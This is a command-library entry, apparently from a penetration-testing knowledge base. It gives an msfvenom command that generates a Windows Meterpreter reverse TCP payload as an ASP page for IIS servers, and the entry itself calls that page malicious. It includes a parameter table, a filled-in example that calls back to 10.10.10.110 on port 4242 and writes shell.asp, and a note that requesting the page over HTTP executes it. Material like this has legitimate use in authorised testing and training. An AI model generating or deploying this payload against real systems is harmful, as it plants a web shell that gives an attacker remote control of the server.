---
id: bad52d6c-bc31-4c2d-8464-701564684cdb
name: msfvenom-generate-windows-meterpreter-reverse-tcp-asp
type: command
executor: bash
data: >-
  msfvenom -p windows/meterpreter/reverse_tcp LHOST="$_LHOST" LPORT="$_LPORT" -f
  asp > $_OUTPUT_FILE
output: null
created_at: '2023-04-06T03:56:21.275423+00:00'
updated_at: '2023-04-10T20:25:02.586400+00:00'
platforms:
  - Windows
tags:
  - meterpreter
  - asp
  - webshell
verified: true
validated: true
---

# msfvenom-generate-windows-meterpreter-reverse-tcp-asp

## Command

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST="$_LHOST" LPORT="$_LPORT" -f asp > $_OUTPUT_FILE
```

## Description

Creates an ASP-formatted Windows Meterpreter reverse TCP payload for IIS web servers, deployable as a malicious ASP page.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -p windows/meterpreter/reverse_tcp | Windows Meterpreter payload | Yes |
| LHOST="$_LHOST" | IP | Yes |
| LPORT="$_LPORT" | Port | Yes |
| -f asp | ASP format | Yes |
| > $_OUTPUT_FILE | Output (e.g., shell.asp) | Yes |

## Examples

### Basic Usage

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST="10.10.10.110" LPORT=4242 -f asp > shell.asp
```

## Expected Output

' shell.asp' with ASP code. Size ~5 KB. Request via HTTP to execute.

## Related

- [[procedures/Meterpreter-Payload-Generation]]
- [[tools/Metasploit-Framework]]
